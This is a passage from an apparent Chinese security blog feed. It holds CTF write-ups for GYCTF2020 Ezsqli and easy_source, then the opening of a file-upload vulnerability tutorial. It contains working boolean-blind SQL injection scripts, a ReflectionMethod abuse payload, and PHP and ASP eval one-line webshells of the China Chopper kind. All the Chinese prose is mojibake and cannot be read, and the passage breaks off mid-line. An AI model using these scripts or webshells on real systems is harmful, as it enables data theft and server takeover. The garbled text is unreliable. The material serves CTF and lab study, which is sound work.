ã€‚</p><p>[GYCTF2020]Ezsqli</p><p>fuzzåï¼Œå‘ç°è¿™é‡Œä¹Ÿè¿‡æ»¤äº†informationï¼Œè€ƒè™‘åˆ©ç”¨sys</p><p>ç®€å•å°è¯•åï¼Œå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œä¹Ÿæ²¡æœ‰æŠ¥é”™ï¼Œå½“è¯­å¥ä¸ºçœŸæ—¶è¿”å›Nu1Lï¼Œä¸ºå‡æ—¶è¿”å›V&amp;Nï¼Œè€ƒè™‘å¸ƒå°”ç›²æ³¨ã€‚</p><p>åˆ¤æ–­è¡¨å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://ead240c2-1793-45a6-8939-a0db7ad04826.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        py = payload.<span class="built_in">format</span>(j,i)</span><br><span class="line">        post_data = &#123;<span class="string">&#x27;id&#x27;</span>: py&#125;</span><br><span class="line">        re = requests.post(url, data=post_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            result += <span class="built_in">chr</span>(i)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸¤ä¸ªè¡¨ï¼Œusers233333333333333,f1ag_1s_h3r3_hhhhh</p><p>ç”±äºè¿‡æ»¤äº†joinï¼Œæ— æ³•çŸ¥é“åˆ—åï¼Œé‡‡ç”¨mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒæ¥è·å–ç¬¬äºŒä¸ªè¡¨çš„å†…å®¹ã€‚</p><p>åˆ¤æ–­è¡¨ä¸­æœ‰ä¸¤ä¸ªå­—æ®µï¼ŒçŒœæµ‹flagåœ¨ç¬¬äºŒåˆ—ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2||((select 1)&gt;(select * from f1ag_1s_h3r3_hhhhh))      bool(false)</span><br><span class="line">id&#x3D;2||((select 1ï¼Œ1)&gt;(select * from f1ag_1s_h3r3_hhhhh))    Nu1l</span><br><span class="line">id&#x3D;2||((select 1,1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))   bool(false)</span><br></pre></td></tr></table></figure><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ead240c2-1793-45a6-8939-a0db7ad04826.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">&quot;2||((select 1,&#123;&#125;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(str_hex(flag+<span class="built_in">chr</span>(j)))</span><br><span class="line">        <span class="comment">#payload=&quot;2||((select 1,(concat(&#123;&#125;,cast(0 as json)))) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;.format(flag+chr(j))</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> flag[-<span class="number">1</span>] ==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>wpå‚è€ƒ <a href="https://r0yanx.com/2020/10/28/fslh-writeup/">fslh-writeup</a></p><p>æ‰«æåå°ç›®å½•å¾—åˆ°index.php.swpï¼Œå°‘è§çš„å¤‡ä»½æ–‡ä»¶æ ¼å¼ï¼Œå…¶æ˜¯ vim æ‰“å¼€æ–‡ä»¶åçš„ç¼“å­˜æ–‡ä»¶<br>å¾—åˆ°æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line">var_dump(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure><p>åˆ†æé¢˜ç›®ï¼ŒçŒœæµ‹ flag æ˜¯è—åœ¨ç±»çš„æ³¨é‡Šä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå®ä¾‹åŒ–ä»»æ„ç±»ï¼Œå¹¶è°ƒç”¨ç±»æ–¹æ³•ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨ PHP å†…ç½®ç±»ä¸­çš„ <code>ReflectionMethod</code> æ¥è¯»å– <code>User</code> ç±»é‡Œé¢å„ä¸ªå‡½æ•°çš„æ³¨é‡Šã€‚</p><p>æ„é€ æˆé¢˜ç›®ä¸­çš„ http å‚æ•°åˆ™æ˜¯ï¼š<code>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></p><p>å› ä¸ºä¸çŸ¥é“æ˜¯åœ¨å“ªä¸ªå‡½æ•°çš„æ³¨é‡Šä¸­ï¼Œæ‰€ä»¥é€ä¸ªå‡½æ•°æš´ç ´ï¼Œæš´ç ´ <code>rb</code> çš„å€¼ <code>a-z</code>ï¼Œå¯ä»¥å‘ç° <code>flag</code> åœ¨ <code>q</code> çš„æ³¨é‡Šä¸­ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1223846800.png" alt="1223846800"></p><p>å…¶ä»–é¢˜ç›®è´¨é‡å¾ˆä¸é”™ï¼ˆçˆ†0ï¼‰ï¼Œæ ¹æœ¬æ²¡æœ‰æ€è·¯ï¼Œå¤§ä½¬çš„wpå¦‚ä¸‹ï¼š</p><p><a href="http://www.xl-bit.cn/index.php/archives/434/">http://www.xl-bit.cn/index.php/archives/434/</a></p><p><a href="http://www.snowywar.top/?p=2190">http://www.snowywar.top/?p=2190</a></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p>[1] <a href="https://www.anquanke.com/post/id/193512">èŠä¸€èŠbypass information_schema</a></p><p>[2] <a href="https://www.136.la/mysql/show-47821.html">SQLi â€”â€” é€—å·ï¼Œç©ºæ ¼ï¼Œå­—æ®µåè¿‡æ»¤çªç ´(ç¤ºä¾‹ä»£ç )</a></p><p>[3] <a href="https://blog.csdn.net/weixin_45669205/article/details/116064642?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">[GYCTF2020]Ezsqliï¼ˆMysqlé€ä½æ¯”è¾ƒï¼‰</a></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜å†ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ciscn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´å­¦ä¹ </title>
      <link href="posts/13382.html"/>
      <url>posts/13382.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ ç®€ä»‹"><a href="#æ–‡ä»¶ä¸Šä¼ ç®€ä»‹" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ç®€ä»‹"></a>æ–‡ä»¶ä¸Šä¼ ç®€ä»‹</h1><p>æ–‡ä»¶ä¸Šä¼ ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½è¡Œä¸ºã€‚å°†å®¢æˆ·ç«¯æ•°æ®ä»¥æ–‡ä»¶å½¢å¼å°è£…ï¼Œé€šè¿‡ç½‘ç»œåè®®å‘é€åˆ°æœåŠ¡å™¨ç«¯ã€‚åœ¨æœåŠ¡å™¨ç«¯è§£ææ•°æ®ï¼Œæœ€ç»ˆåœ¨æœåŠ¡ç«¯ç¡¬ç›˜ä¸Šä½œä¸ºçœŸå®çš„æ–‡ä»¶ä¿å­˜ã€‚</p><p><strong>æ¼æ´äº§ç”ŸåŸå› </strong>ï¼šå¤§éƒ¨åˆ†çš„ç½‘ç«™å’Œåº”ç”¨ç³»ç»Ÿéƒ½æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œä¸€äº›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½å®ç°ä»£ç æ²¡æœ‰ä¸¥æ ¼é™åˆ¶ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åç¼€ä»¥åŠæ–‡ä»¶ç±»å‹ï¼Œå¯¼è‡´å…è®¸æ”»å‡»è€…å‘æŸä¸ªå¯é€šè¿‡ Web è®¿é—®çš„ç›®å½•ä¸Šä¼ ä»»æ„ PHP æ–‡ä»¶ï¼Œå¹¶èƒ½å¤Ÿå°†è¿™äº›æ–‡ä»¶ä¼ é€’ç»™ PHP è§£é‡Šå™¨ï¼Œå°±å¯ä»¥åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPè„šæœ¬ã€‚å¦å¤–ï¼ŒæœåŠ¡å™¨é…ç½®ä¸å½“ã€å¼€æºç¼–è¾‘å™¨çš„ä¸Šä¼ æ¼æ´ã€æ–‡ä»¶ä¸Šä¼ é™åˆ¶è¢«ç»•è¿‡ã€æ–‡ä»¶è§£ææ¼æ´å¯¼è‡´æ–‡ä»¶æ‰§è¡Œç­‰éƒ½æœ‰å¯èƒ½äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚</p><p><strong>æ¼æ´å±å®³</strong>:å½“ç³»ç»Ÿå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥å°†ç—…æ¯’ï¼Œæœ¨é©¬ï¼ŒWebShellï¼Œå…¶ä»–æ¶æ„è„šæœ¬æˆ–è€…æ˜¯åŒ…å«äº†è„šæœ¬çš„å›¾ç‰‡ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å¦‚æœå¯¹å…¶è§£ææ‰§è¡Œåˆ™ä¼šé€ æˆå¾ˆå¤§çš„å±å®³ã€‚</p><blockquote><p>WebShell å°±æ˜¯ä»¥ aspã€phpã€jsp æˆ–è€… cgi ç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°ä¹‹ä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚æ”»å‡»è€…åœ¨å…¥ä¾µäº†ä¸€ä¸ªç½‘ç«™åï¼Œé€šå¸¸ä¼šå°†è¿™äº› asp æˆ– php åé—¨æ–‡ä»¶ä¸ç½‘ç«™æœåŠ¡å™¨ web ç›®å½•ä¸‹æ­£å¸¸çš„ç½‘é¡µæ–‡ä»¶æ··åœ¨ä¸€èµ·ï¼Œç„¶åä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®è¿™äº›åé—¨ï¼Œå¾—åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä»¥è¾¾åˆ°æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ï¼ˆå¯ä»¥ä¸Šä¼ ä¸‹è½½æˆ–è€…ä¿®æ”¹æ–‡ä»¶ï¼Œæ“ä½œæ•°æ®åº“ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ç­‰ï¼‰ã€‚</p></blockquote><h1 id="ç»•è¿‡æ–‡ä»¶æ£€æµ‹"><a href="#ç»•è¿‡æ–‡ä»¶æ£€æµ‹" class="headerlink" title="ç»•è¿‡æ–‡ä»¶æ£€æµ‹"></a>ç»•è¿‡æ–‡ä»¶æ£€æµ‹</h1><p>é€šå¸¸ä¸€ä¸ªæ–‡ä»¶ä»¥HTTPåè®®è¿›è¡Œä¸Šä¼ æ—¶ï¼Œå°†ä»¥POSTè¯·æ±‚å‘é€è‡³WebæœåŠ¡å™¨ï¼ŒWebæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚å¹¶åŒæ„åï¼Œç”¨æˆ·ä¸WebæœåŠ¡å™¨å°†å»ºç«‹è¿æ¥ï¼Œå¹¶ä¼ è¾“æ•°æ®ã€‚ä¸€èˆ¬ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­çš„<strong>æ£€æµ‹æ–¹å¼</strong>æœ‰âˆ¶</p><ol><li>å®¢æˆ·ç«¯JavaScriptæ£€æµ‹ï¼ˆæ£€æµ‹æ–‡ä»¶æ‰©å±•åï¼‰</li><li>æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹ï¼ˆæ£€æµ‹content-typeå†…å®¹)</li><li>æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹ï¼ˆæ£€æµ‹è·Ÿpathå‚æ•°ç›¸å…³çš„å†…å®¹)</li><li>æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹ï¼ˆæ£€æµ‹å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç ï¼‰ç­‰ã€‚</li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416130421578.png" alt="image-20210416130421578"></p><h2 id="ç»•è¿‡å®¢æˆ·ç«¯æ£€æµ‹"><a href="#ç»•è¿‡å®¢æˆ·ç«¯æ£€æµ‹" class="headerlink" title="ç»•è¿‡å®¢æˆ·ç«¯æ£€æµ‹"></a>ç»•è¿‡å®¢æˆ·ç«¯æ£€æµ‹</h2><p>åŸç†ï¼šé€šå¸¸åœ¨ä¸Šä¼ é¡µé¢é‡Œå«æœ‰ä¸“é—¨æ£€æµ‹æ–‡ä»¶ä¸Šä¼ çš„JavaScriptä»£ç ï¼Œæœ€å¸¸è§çš„å°±æ˜¯æ£€æµ‹æ–‡ä»¶ç±»å‹å’Œæ‰©å±•åæ˜¯å¦åˆæ³•ã€‚</p><p>æ–¹æ³•ï¼šåœ¨æœ¬åœ°æµè§ˆå™¨å®¢æˆ·ç«¯ç¦ç”¨JSå³å¯;å¯ä½¿ç”¨ç«ç‹æµè§ˆå™¨çš„Noscriptæ’ä»¶ã€IEä¸­ç¦ç”¨JSç­‰æ–¹å¼å®ç°ã€‚</p><p>æµ‹è¯•ï¼šupload-labs/Pass-01</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415231636662.png" alt="image-20210415231636662"></p><p>è¿™é‡Œçš„jsæ£€æµ‹æ–‡ä»¶çš„æ‰©å±•åï¼Œåªå…è®¸.jpgã€.pngã€.gifæ–‡ä»¶ä¸Šä¼ ã€‚</p><p>ä½†æˆ‘ä»¬å¯ä»¥ç¦ç”¨æ­¤jsï¼Œæˆ–è€…ç”¨burpæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹ï¼ˆä¸Šä¼ 1.jpgä¿®æ”¹ä¸º1.phpï¼‰</p><p>æŒ‰ç…§æƒ¯ä¾‹ï¼Œä¸Šä¼ æœ€ç®€å•çš„ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415233539502.png" alt="image-20210415233539502"></p><p>æŸ¥çœ‹phpinfo()</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415234903809.png" alt="image-20210415234903809"></p><p>ä¸Šèœåˆ€ï¼Œå¯ä»¥çœ‹åˆ°æ•´ä¸ªç½‘ç«™çš„ç»“æ„å’Œæ–‡ä»¶ï¼Œç”šè‡³æ˜¯æš´éœ²äº†ä¸»æœºçš„ç£ç›˜å­˜å‚¨ï¼ï¼å¯ä»¥è¿›è¡Œä»»æ„éæ³•å¢åˆ æŸ¥æ”¹ï¼ï¼ç½‘ç«™ï¼ˆä¸»æœºï¼‰è‡³æ­¤æ²¦é™·â€¦â€¦</p><blockquote><p>**â€ä¸­å›½èœåˆ€â€**ï¼šä»…éœ€è¦ä¸€æ®µç®€çŸ­çš„ä»£ç ä¾¿å¯ä»¥ç®¡ç†ç½‘ç«™ã€‚ç›®å‰æ”¯æŒçš„æœåŠ¡å™¨ç«¯è„šæœ¬åŒ…æ‹¬: phpã€ASPã€ASP.NETã€JSPç­‰ï¼Œå¹¶ä¸”æ”¯æŒHTTPSå®‰å…¨è¿æ¥çš„ç½‘ç«™ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP: &lt;?php @eval($_POST[&#39;mima&#39;]);?&gt;</span><br><span class="line">ASP: &lt;%eval request(&quot;mima&quot;)%&gt;</span><br><span class="line">ASP.NET &lt;%@ Page 